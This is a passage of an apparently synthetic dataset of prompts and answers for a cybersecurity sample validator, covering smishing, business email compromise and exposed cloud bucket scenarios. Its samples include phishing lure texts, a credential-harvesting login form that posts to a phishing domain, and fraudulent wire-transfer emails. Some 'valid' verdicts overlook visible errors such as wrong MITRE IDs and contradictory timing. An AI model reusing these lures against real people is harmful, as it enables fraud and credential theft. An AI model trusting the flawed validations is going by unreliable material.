+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Spear phishing via SMS directing employee to credential harvesting site with URL obfuscation"",
+  ""technical_data"": {
+    ""sms_message"": ""From: +1-415-555-0199\r\nTo: +1-415-555-0123\r\nDate: 2023-05-25T08:12:45-07:00\r\nMessage: \""Your HR portal account has been suspended. Verify immediately: hxxps://hr-ver1fy.secure-portal.us/login?session=ab12cd34ef56\"""",
+    ""url_analysis"": {
+      ""original_url"": ""hxxps://hr-ver1fy.secure-portal.us/login?session=ab12cd34ef56"",
+      ""decoded_url"": ""https://hr-ver1fy.secure-portal.us/login?session=ab12cd34ef56"",
+      ""domain_parts"": {
+        ""subdomain"": ""hr-ver1fy"",
+        ""second_level_domain"": ""secure-portal"",
+        ""top_level_domain"": ""us""
+      },
+      ""domain_registration"": {
+        ""domain"": ""secure-portal.us"",
+        ""registrant"": ""Privacy Protect LLC"",
+        ""creation_date"": ""2023-03-10T12:00:00Z"",
+        ""expiration_date"": ""2024-03-10T12:00:00Z"",
+        ""name_servers"": [
+          ""ns1.privdns.com"",
+          ""ns2.privdns.com""
+        ],
+        ""status"": ""ok""
+      },
+      ""url_obfuscation_methods"": [
+        ""Subdomain 'hr-ver1fy' uses '1' instead of 'i' to mimic 'hr-verify'"",
+        ""Use of hyphen to separate 'secure-portal' to appear legitimate"",
+        ""Top-level domain '.us' instead of .com to evade common blacklist"",
+        ""Use of session token query parameter to appear dynamic and legitimate""
+      ]
+    },
+    ""web_server_access_log"": ""198.51.100.77 - - [25/May/2023:08:13:02 -0700] \""GET /login?session=ab12cd34ef56 HTTP/1.1\"" 200 4523 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\"""",
+    ""html_login_form_snippet"": ""<form action=\""https://secure-portal.us/authenticate\"" method=\""POST\"">\r\n  <input type=\""text\"" name=\""username\"" placeholder=\""Username\"" required />\r\n  <input type=\""password\"" name=\""password\"" placeholder=\""Password\"" required />\r\n  <input type=\""submit\"" value=\""Login\"" />\r\n</form>"",
+    ""post_capture"": ""POST /authenticate HTTP/1.1\r\nHost: secure-portal.us\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 38\r\n\r\nusername=jdoe&password=Password123!"",
+    ""dns_traffic"": ""23:14:56.123456 IP 10.5.100.12.51234 > 198.51.100.77.53: 12345+ A? hr-ver1fy.secure-portal.us. (45)"",
+    ""phishing_server_response"": ""HTTP/1.1 302 Found\r\nLocation: https://company-hr.us/dashboard\r\nContent-Length: 0\r\n\r\n""
+  },
+  ""indicators"": [
+    ""SMS message from unknown international number with urgent HR alert"",
+    ""Domain secure-portal.us newly registered and uses privacy protection"",
+    ""Domain uses visual homoglyph substitution in subdomain hr-ver1fy"",
+    ""Phishing landing page mimics legitimate HR portal login form"",
+    ""Credentials POSTed in cleartext to external phishing server"",
+    ""Redirect to legitimate company HR site after credential theft to reduce suspicion""
+  ],
+  ""detection_method"": ""Mobile security gateway flags suspicious domain and URL obfuscation; DNS logs detect lookups for newly registered domain; web proxy logs show POST of credentials to suspicious server; user reports unexpected SMS requesting login"",
+  ""relevant_mitre_techniques"": [
+    ""T1566.003 - Phishing: Spearphishing via Service"",
+    ""T1566.002 - Phishing: Spearphishing Link"",
+    ""T1539 - Steal Web Session Cookie"",
+    ""T1587.001 - Develop Capabilities: Spearphishing""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": false, ""issues"": [""The sample scenario describes spear phishing via SMS, which is a form of smishing, not email-based spear phishing as specified in the problem description."", ""The problem description specifies highly targeted phishing emails, but the sample uses SMS messages instead of emails."", ""The sample lacks explicit mention or evidence of use of personal information to craft the message targeting a specific individual, which is key to spear phishing."", ""The 'risk reduction' measures from the problem description are not referenced or linked to the sample indicators or detection methods."", ""The 'indicators' and 'detection_method' fields are well populated but do not explicitly connect to the use of personal information or employee education/verification procedures.""], ""comments"": ""While the sample provides a detailed and realistic example of a targeted phishing attack via SMS (smishing) with strong technical data and indicators, it does not fully align with the stated problem of spear phishing via email. Spear phishing specifically involves highly targeted emails crafted using personal information to deceive individuals. The sample should be adjusted to use email as the attack vector and demonstrate how personal information is leveraged to increase the attack's effectiveness. Additionally, the sample should explicitly reference or incorporate the recommended risk reduction strategies such as employee education and verification procedures to improve completeness and relevance. Overall, the technical depth and realism are strong, but alignment with the problem scope and completeness regarding risk reduction need improvement.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Social Engineering
+- Nature: business_email_compromise
+- Description: Attackers compromise or spoof executive email accounts to request fraudulent wire transfers or sensitive information from employees.
+- Risk Reduction: Enable email authentication protocols like DMARC, DKIM, and SPF, Establish multi-step verification for financial transactions, Monitor email accounts for unusual sending patterns
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Executive email account spoofed to request urgent wire transfer"",
+  ""technical_data"": {
+    ""email_headers"": ""Return-Path: <ceo@contoso.com>\r\nReceived: from mail-contoso.com (mail-contoso.com [192.168.1.10])\r\n\tby mail.examplecorp.com (Postfix) with ESMTPS id 1234ABCD\r\n\tfor <finance@examplecorp.com>; Tue, 25 Apr 2023 08:15:12 -0400 (EDT)\r\nReceived-SPF: fail (examplecorp.com: domain of ceo@contoso.com does not designate 192.168.1.10 as permitted sender) receiver=mail.examplecorp.com; envelope-from=ceo@contoso.com; client-ip=192.168.1.10;\r\nAuthentication-Results: mail.examplecorp.com; dkim=fail (signature did not verify) header.d=contoso.com; spf=fail smtp.mailfrom=ceo@contoso.com; dmarc=fail action=quarantine header.from=contoso.com;\r\nMessage-ID: <CAKJ1234567890@mail-contoso.com>\r\nFrom: \""John Doe\"" <ceo@contoso.com>\r\nTo: finance@examplecorp.com\r\nSubject: Urgent Wire Transfer Request\r\nDate: Tue, 25 Apr 2023 08:14:55 -0400\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=\""UTF-8\""\r\nX-Mailer: Microsoft Outlook 16.0\r\n"",
+    ""email_body"": ""Hi,\n\nPlease process an urgent wire transfer of $150,000 to the following account:\n\nBank: First National Bank\nAccount Number: 9876543210\nRouting Number: 021000021\nAccount Holder: Michael Thompson\n\nThis is a confidential and urgent matter.\n\nRegards,\nJohn Doe\nCEO, Contoso Ltd."",
+    ""smtp_transaction_log"": ""220 mail.examplecorp.com ESMTP Postfix\r\nEHLO attacker.com\r\n250-mail.examplecorp.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH LOGIN PLAIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<ceo@contoso.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<finance@examplecorp.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: John Doe <ceo@contoso.com>\r\nTo: finance@examplecorp.com\r\nSubject: Urgent Wire Transfer Request\r\n\r\n[Email body]\r\n.\r\n250 2.0.0 Ok: queued as 1234ABCD"",
+    ""domain_registration"": {
+      ""domain"": ""contoso.com"",
+      ""registrar"": ""GoDaddy.com, LLC"",
+      ""creation_date"": ""1995-05-15T00:00:00Z"",
+      ""updated_date"": ""2022-10-10T12:00:00Z"",
+      ""status"": ""active"",
+      ""nameservers"": [
+        ""ns1.contoso.com"",
+        ""ns2.contoso.com""
+      ]
+    },
+    ""email_authentication"": {
+      ""SPF_record"": ""v=spf1 ip4:192.168.2.0/24 -all"",
+      ""DKIM_signature"": ""v=1; a=rsa-sha256; c=relaxed/relaxed; d=contoso.com; s=selector1; h=from:to:subject:date; bh=base64hash==; b=invalidsignature=="",
+      ""DMARC_policy"": ""v=DMARC1; p=quarantine; rua=mailto:dmarc-reports@contoso.com; ruf=mailto:dmarc-forensics@contoso.com; pct=100; sp=none""
+    },
+    ""unusual_sending_patterns"": {
+      ""timestamp"": ""2023-04-25T08:14:55-04:00"",
+      ""sender_ip"": ""192.168.1.10"",
+      ""email_volume"": ""5 emails/hour normally; 20 emails/hour detected"",
+      ""geolocation"": ""Sender IP located in unknown country not typical for CEO""
+    }
+  },
+  ""indicators"": [
+    ""SPF fail for ceo@contoso.com from IP 192.168.1.10"",
+    ""DKIM signature verification failed for contoso.com"",
+    ""DMARC policy resulted in quarantine action"",
+    ""Sender IP 192.168.1.10 is not in authorized SPF range"",
+    ""Email sent outside normal business hours and from unusual geolocation"",
+    ""Urgent wire transfer request with new beneficiary account""
+  ],
+  ""detection_method"": ""Automated alert on DMARC/SPF/DKIM failures combined with anomaly detection on executive email sending patterns and verification of wire transfer requests through multi-factor confirmation."",
+  ""relevant_mitre_techniques"": [
+    ""T1598.002 - Spearphishing via Service"",
+    ""T1566.001 - Phishing: Spearphishing Attachment"",
+    ""T1589.002 - Gather Victim Identity Information: Email Accounts"",
+    ""T1036.005 - Masquerading: Match Legitimate Name or Location"",
+    ""T1114 - Email Collection""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a business email compromise scenario within the social engineering domain. The scenario describes an executive email account spoofed to request an urgent wire transfer, aligning well with the problem nature. The technical data includes realistic email headers showing SPF, DKIM, and DMARC failures, which are key indicators of spoofing. The SMTP transaction log and domain registration details add depth and realism. The email authentication records correctly show a restrictive SPF record that excludes the sender IP, an invalid DKIM signature, and a DMARC policy that results in quarantine, all supporting the detection of spoofing. Unusual sending patterns and geolocation anomalies further reinforce the suspicious nature of the email. The indicators list clearly explains why this sample matches the problem, highlighting authentication failures, unusual sender IP, and the urgent wire transfer request. The detection method describes a practical approach combining email authentication failures with behavioral anomaly detection and multi-factor verification, which aligns with recommended risk reduction strategies. The inclusion of relevant MITRE ATT&CK techniques is appropriate and relevant. Overall, the sample is complete, realistic, and technically detailed, making it a strong representation of the stated cybersecurity problem.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Social Engineering
+- Nature: business_email_compromise
+- Description: Attackers compromise or spoof executive email accounts to request fraudulent wire transfers or sensitive information from employees.
+- Risk Reduction: Enable email authentication protocols like DMARC, DKIM, and SPF, Establish multi-step verification for financial transactions, Monitor email accounts for unusual sending patterns
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Business Email Compromise via domain look-alike phishing email impersonating CFO"",
+  ""technical_data"": {
+    ""email_headers"": ""Return-Path: <john.doe@contooso.com>\r\nReceived: from mail.contooso.com (mail.contooso.com [198.51.100.45])\r\n\tby mail.examplecorp.com (Postfix) with ESMTPS id 9F8C2B1E\r\n\tfor <accounts@examplecorp.com>; Wed, 12 Jul 2023 13:22:50 +0200 (CEST)\r\nReceived-SPF: pass (examplecorp.com: domain of sender@examplecorp.com designates 198.51.100.45 as permitted sender) receiver=mail.examplecorp.com; client-ip=198.51.100.45;\r\nAuthentication-Results: mail.examplecorp.com; dkim=fail (signature did not verify) header.d=contooso.com; spf=pass smtp.mailfrom=john.doe@contooso.com; dmarc=fail action=none header.from=contooso.com;\r\nMessage-ID: <CAJYt3j2k4H@mail.contooso.com>\r\nFrom: \""John Doe\"" <john.doe@contooso.com>\r\nTo: accounts@examplecorp.com\r\nSubject: Payment instructions update\r\nDate: Wed, 12 Jul 2023 13:22:45 +0200\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\""UTF-8\""\r\nX-Mailer: Mozilla Thunderbird 68.10.0\r\n"",
+    ""email_body_html"": ""<html><body><p>Dear Accounts Team,</p><p>Please update the payment details for the next invoice as follows:</p><table><tr><td>Bank:</td><td>Global Trust Bank</td></tr><tr><td>Account Number:</td><td>1234098765</td></tr><tr><td>Routing Number:</td><td>11000022</td></tr></table><p>Kindly confirm once done.</p><p>Regards,<br>John Doe<br>CFO</p></body></html>"",
+    ""smtp_transaction_log"": ""220 mail.examplecorp.com ESMTP Postfix\r\nEHLO mail.contooso.com\r\n250-mail.examplecorp.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH LOGIN PLAIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<john.doe@contooso.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<accounts@examplecorp.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email headers and body]\r\n.\r\n250 2.0.0 Ok: queued as 9F8C2B1E"",
+    ""domain_registration"": {
+      ""domain"": ""contooso.com"",
+      ""registrar"": ""NameCheap, Inc."",
+      ""creation_date"": ""2023-05-01T15:00:00Z"",
+      ""updated_date"": ""2023-07-10T10:00:00Z"",
+      ""status"": ""active"",
+      ""nameservers"": [
+        ""ns1.namecheap.net"",
+        ""ns2.namecheap.net""
+      ]
+    },
+    ""email_authentication"": {
+      ""SPF_record"": ""v=spf1 ip4:198.51.100.0/24 -all"",
+      ""DKIM_signature"": ""v=1; a=rsa-sha256; c=relaxed/relaxed; d=contooso.com; s=mail; h=from:to:subject:date; bh=abc123base64hash==; b=invalidsig=="",
+      ""DMARC_policy"": ""v=DMARC1; p=reject; rua=mailto:dmarc@contooso.com; ruf=mailto:forensics@contooso.com; pct=100""
+    },
+    ""url_obfuscation"": {
+      ""link_in_email"": ""https://globaltrust-bank.com.secure-login.contoso.com/login"",
+      ""actual_dns_resolution"": ""contoso.com resolves to 198.51.100.45, globaltrust-bank.com does not resolve"",
+      ""whois_info_globaltrust"": ""Domain not registered or parked""
+    },
+    ""unusual_sending_patterns"": {
+      ""email_time"": ""13:22 local time (outside typical CFO email hours 9am-5pm)"",
+      ""sender_ip_geolocation"": ""Germany (company CFO located in USA)"",
+      ""email_volume"": ""1 email matching this pattern in last 30 days""
+    }
+  },
+  ""indicators"": [
+    ""DKIM signature verification fail for domain contooso.com"",
+    ""DMARC policy fail and no rejection enforcement"",
+    ""Domain contooso.com registered recently (within 2 months)"",
+    ""Sender IP geolocated in Germany, CFO based in USA"",
+    ""Suspicious URL using subdomain trickery to mimic legitimate bank URL"",
+    ""Email requesting change in payment details without multi-factor verification""
+  ],
+  ""detection_method"": ""Correlate domain age and registration info with DMARC/SPF/DKIM results, monitor for look-alike domain emails, inspect URLs in email content for subdomain obfuscation, and require multi-factor verification on payment detail updates."",
+  ""relevant_mitre_techniques"": [
+    ""T1598.002 - Spearphishing via Service"",
+    ""T1566.001 - Phishing: Spearphishing Attachment"",
+    ""T1566.002 - Spearphishing Link"",
+    ""T1204.002 - User Execution: Malicious File"",
+    ""T1114 - Email Collection"",
+    ""T1036.005 - Masquerading: Match Legitimate Name or Location""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a business email compromise (BEC) scenario involving social engineering through a domain look-alike phishing email impersonating a CFO. The scenario aligns well with the problem nature by demonstrating spoofing of an executive's email domain (contooso.com vs. a legitimate company domain) to request fraudulent payment details. The technical data is comprehensive and realistic, including email headers showing SPF pass but DKIM and DMARC failures, a recently registered suspicious domain, unusual sending patterns (time and geolocation), and URL obfuscation via subdomain trickery. The indicators clearly explain why this sample matches the problem, highlighting authentication failures, domain age, sender location mismatch, suspicious URLs, and the nature of the request (payment detail change without multi-factor verification). The detection method and relevant MITRE techniques are appropriate and support the scenario. All required fields are present and accurately populated, providing a complete and plausible example for this cybersecurity problem.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Social Engineering
+- Nature: business_email_compromise
+- Description: Attackers compromise or spoof executive email accounts to request fraudulent wire transfers or sensitive information from employees.
+- Risk Reduction: Enable email authentication protocols like DMARC, DKIM, and SPF, Establish multi-step verification for financial transactions, Monitor email accounts for unusual sending patterns
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Compromised executive mailbox used to send fraudulent wire transfer instructions"",
+  ""technical_data"": {
+    ""exchange_logs"": [
+      ""2023-08-15T09:10:23Z INFO MailboxAccess - User: john.doe@examplecorp.com - SessionID: 5a3f2e8c - ClientIP: 203.0.113.77 - Action: Login Success"",
+      ""2023-08-15T09:12:01Z WARN MailboxSend - User: john.doe@examplecorp.com - SessionID: 5a3f2e8c - MessageID: <CAFbWJ7bK0eO@mail.examplecorp.com> - Subject: Wire transfer approval - Recipient: finance@examplecorp.com"",
+      ""2023-08-15T09:12:02Z INFO MailboxSend - User: john.doe@examplecorp.com - SessionID: 5a3f2e8c - MessageID: <CAFbWJ7bK0eO@mail.examplecorp.com> - Email sent successfully""
+    ],
+    ""email_content"": {
+      ""headers"": ""Return-Path: <john.doe@examplecorp.com>\r\nReceived: from mail.examplecorp.com ([203.0.113.77])\r\n\tby mail.examplecorp.com (Microsoft SMTP Server) with TLS encryption;\r\n\tTue, 15 Aug 2023 09:12:01 +0000\r\nAuthentication-Results: mail.examplecorp.com; dkim=pass header.d=examplecorp.com; spf=pass smtp.mailfrom=john.doe@examplecorp.com; dmarc=pass action=none header.from=examplecorp.com;\r\nFrom: John Doe <john.doe@examplecorp.com>\r\nTo: finance@examplecorp.com\r\nSubject: Wire transfer approval\r\nDate: Tue, 15 Aug 2023 09:12:00 +0000\r\nMessage-ID: <CAFbWJ7bK0eO@mail.examplecorp.com>\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=UTF-8\r\n"",
+      ""body"": ""Hi Finance Team,\n\nPlease process the following wire transfer immediately:\n\nAmount: $250,000\nBank: United Bank\nAccount Number: 876543210\nRouting Number: 021000021\nAccount Holder: Richard Miles\n\nPlease confirm once completed.\n\nRegards,\nJohn Doe\nCEO""
+    },
+    ""user_activity_logs"": [
+      ""2023-08-15T06:58:43Z WARNING SuspiciousLogin - User: john.doe@examplecorp.com - IP: 185.199.108.153 - Location: Russia - Anomalous login detected"",
+      ""2023-08-15T07:00:10Z INFO PasswordChange - User: john.doe@examplecorp.com - IP: 185.199.108.153 - Password reset via self-service portal"",
+      ""2023-08-15T08:45:00Z INFO Login - User: john.doe@examplecorp.com - IP: 203.0.113.77 - Location: USA""
+    ],
+    ""network_traffic"": ""13:12:00.456 IP 203.0.113.77.58714 > mail.examplecorp.com.443: Flags [P.], seq 12345:12456, ack 112233, win 65535, length 111\r\n[Encrypted TLS packet containing SMTP submission]"",
+    ""multi_factor_authentication_logs"": [
+      ""2023-08-15T06:59:30Z MFA_Failure - User: john.doe@examplecorp.com - Reason: MFA device unregistered during password reset"",
+      ""2023-08-15T07:00:10Z MFA_Bypass - User: john.doe@examplecorp.com - Method: Security questions""
+    ]
+  },
+  ""indicators"": [
+    ""Login to executive mailbox from anomalous IP located in Russia"",
+    ""Password reset without valid MFA enforcement"",
+    ""Subsequent login from legitimate IP shortly after"",
+    ""Emails sent with valid DKIM/SPF/DMARC but unusual volume and content"",
+    ""Wire transfer instruction without multi-step verification"",
+    ""MFA bypass using insecure fallback (security questions)""
+  ],
+  ""detection_method"": ""Correlate unusual login activity to mailbox access and password resets, monitor for bypassed MFA events, alert on sending of financial requests from executive mailbox outside normal patterns, enforce multi-step financial transaction verification."",
+  ""relevant_mitre_techniques"": [
+    ""T1078.004 - Valid Accounts: Cloud Accounts"",
+    ""T1110.003 - Brute Force: Password Spraying"",
+    ""T1556.001 - Modify Authentication Process: MFA"",
+    ""T1566.001 - Phishing: Spearphishing Attachment"",
+    ""T1598.002 - Spearphishing via Service"",
+    ""T1086 - PowerShell (if used in lateral movement)"",
+    ""T1036.005 - Masquerading""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a business email compromise scenario within the social engineering domain. The scenario describes a compromised executive mailbox used to send fraudulent wire transfer instructions, which aligns well with the problem nature. The technical data includes realistic and detailed logs such as exchange logs, email headers showing valid DKIM/SPF/DMARC authentication, user activity logs indicating anomalous login from a suspicious IP in Russia, password reset with MFA bypass, and network traffic consistent with SMTP submission. The indicators clearly explain why this is a business email compromise, highlighting anomalous login, MFA bypass, and suspicious email content requesting wire transfers without multi-step verification. The detection method is appropriate and addresses correlating unusual login activity, monitoring MFA bypass, and enforcing multi-step verification for financial transactions. The inclusion of relevant MITRE ATT&CK techniques is comprehensive and relevant. All required fields are present and accurately populated. Overall, the sample is realistic, complete, and well-documented, making it a valid and useful example for this cybersecurity problem.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Cloud Security
+- Nature: misconfigured_storage
+- Description: Misconfigured cloud storage buckets or services exposing sensitive data publicly or to unauthorized users, leading to data breaches or leakage.
+- Risk Reduction: Implement automated configuration scanning and compliance checks, Enforce least privilege access controls and role-based access, Use cloud provider security posture management (CSPM) tools
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Publicly exposed AWS S3 bucket containing sensitive PII data due to overly permissive bucket policy allowing anonymous user GetObject access."",
+  ""technical_data"": {
+    ""bucket_policy"": ""{\n  \""Version\"": \""2012-10-17\"",\n  \""Statement\"": [\n    {\n      \""Sid\"": \""AllowPublicRead\"",\n      \""Effect\"": \""Allow\"",\n      \""Principal\"": \""*\"",\n      \""Action\"": \""s3:GetObject\"",\n      \""Resource\"": \""arn:aws:s3:::customer-data-bucket/*\""\n    }\n  ]\n}"",
+    ""aws_cli_command"": ""aws s3api get-bucket-policy --bucket customer-data-bucket"",
+    ""cloudtrail_log_entry"": ""{\n  \""eventVersion\"": \""1.08\"",\n  \""userIdentity\"": {\n    \""type\"": \""Anonymous\"",\n    \""principalId\"": \""ANONYMOUS\""\n  },\n  \""eventTime\"": \""2024-04-15T14:22:30Z\"",\n  \""eventSource\"": \""s3.amazonaws.com\"",\n  \""eventName\"": \""GetObject\"",\n  \""requestParameters\"": {\n    \""bucketName\"": \""customer-data-bucket\"",\n    \""key\"": \""pii/20240415_customer_list.csv\""\n  },\n  \""responseElements\"": null,\n  \""sourceIPAddress\"": \""203.0.113.45\"",\n  \""userAgent\"": \""curl/7.68.0\"",\n  \""requestID\"": \""69A1D8F3C1234567\"",\n  \""eventID\"": \""d0f9a8c9-4a2a-4a3b-8f7e-8c9b1f5a0e5f\"",\n  \""readOnly\"": true\n}"",
+    ""http_request"": ""GET /customer-data-bucket/pii/20240415_customer_list.csv HTTP/1.1\r\nHost: customer-data-bucket.s3.amazonaws.com\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n"",
+    ""pii_file_sample"": ""\""name\"",\""ssn\"",\""email\"",\""phone\""\n\""John Doe\"",\""123-45-6789\"",\""john.doe@example.com\"",\""+1-555-0100\""\n\""Jane Smith\"",\""987-65-4321\"",\""jane.smith@example.com\"",\""+1-555-0200\""\n""
+  },
+  ""indicators"": [
+    ""S3 bucket policy allowing \""Principal\"": \""*\"" with s3:GetObject"",
+    ""CloudTrail entries showing Anonymous user identity accessing sensitive keys"",
+    ""HTTP GET requests from unusual external IPs to S3 objects under /pii/"",
+    ""Presence of CSV or JSON files with PII fields in bucket""
+  ],
+  ""detection_method"": ""Implement continuous bucket policy scanning using AWS Config rules or third-party CSPM tools to detect public read permissions; monitor CloudTrail logs for GetObject events with Anonymous user identities; alert on downloads of sensitive prefixes (e.g., /pii/); use data loss prevention (DLP) for content inspection of data accessed."",
+  ""relevant_mitre_techniques"": [
+    ""T1530 - Data from Cloud Storage Object"",
+    ""T1552.001 - Credentials in Files: Cloud Storage Object"",
+    ""T1078.004 - Valid Accounts: Cloud Accounts""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a misconfigured cloud storage scenario involving an AWS S3 bucket with an overly permissive bucket policy that allows anonymous public read access to sensitive PII data. The technical data includes a realistic bucket policy JSON, a plausible AWS CLI command to retrieve the policy, a detailed CloudTrail log entry showing anonymous access to sensitive objects, an HTTP GET request example, and a sample of PII data, all of which align well with the problem description. The indicators clearly explain why this is a misconfiguration leading to data exposure. The detection methods are appropriate and align with recommended risk reduction strategies such as automated scanning, monitoring CloudTrail logs, and data loss prevention. The inclusion of relevant MITRE ATT&CK techniques further strengthens the sample's completeness and realism. Overall, the sample is comprehensive, realistic, and correctly structured for the stated problem.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Cloud Security
+- Nature: misconfigured_storage
+- Description: Misconfigured cloud storage buckets or services exposing sensitive data publicly or to unauthorized users, leading to data breaches or leakage.
+- Risk Reduction: Implement automated configuration scanning and compliance checks, Enforce least privilege access controls and role-based access, Use cloud provider security posture management (CSPM) tools
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Misconfigured Google Cloud Storage (GCS) bucket with IAM policy granting allUsers role storage.objectViewer, leading to public data leakage of internal project documentation."",
+  ""technical_data"": {
+    ""gcloud_iam_policy"": ""{\n  \""bindings\"": [\n    {\n      \""role\"": \""roles/storage.objectViewer\"",\n      \""members\"": [\n        \""allUsers\""\n      ]\n    }\n  ]\n}"",
+    ""gcloud_command_to_get_policy"": ""gcloud storage buckets get-iam-policy gs://internal-docs-bucket"",
+    ""access_log_entry"": ""2024-05-10T08:45:22Z storage.googleapis.com GET https://storage.googleapis.com/internal-docs-bucket/confidential_architecture.pdf 200 - 192.0.2.100 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"",
+    ""curl_http_request"": ""GET /internal-docs-bucket/confidential_architecture.pdf HTTP/1.1\r\nHost: storage.googleapis.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: application/pdf\r\n\r\n"",
+    ""bucket_listing_response"": ""{\n  \""kind\"": \""storage#objects\"",\n  \""items\"": [\n    {\n      \""name\"": \""confidential_architecture.pdf\"",\n      \""bucket\"": \""internal-docs-bucket\"",\n      \""contentType\"": \""application/pdf\"",\n      \""size\"": \""10485760\""\n    },\n    {\n      \""name\"": \""employee_salaries_2024.xlsx\"",\n      \""bucket\"": \""internal-docs-bucket\"",\n      \""contentType\"": \""application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\"",\n      \""size\"": \""204800\""\n    }\n  ]\n}"",
+    ""example_pdf_metadata"": ""%PDF-1.7\n%\u00e2\u00e3\u00cf\u00d3\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n4 0 obj\n<< /Length 55 >>\nstream\nBT\n/F1 24 Tf\n100 700 Td\n(Confidential Architecture Diagram) Tj\nET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000010 00000 n \n0000000060 00000 n \n0000000115 00000 n \n0000000210 00000 n \ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n300\n%%EOF""
+  },
+  ""indicators"": [
+    ""GCS bucket IAM policy with \""allUsers\"" member assigned roles/storage.objectViewer"",
+    ""Access logs showing anonymous IPs downloading confidential PDF and XLSX files"",
+    ""Publicly accessible bucket listing via API"",
+    ""Presence of sensitive document metadata and filenames in bucket""
+  ],
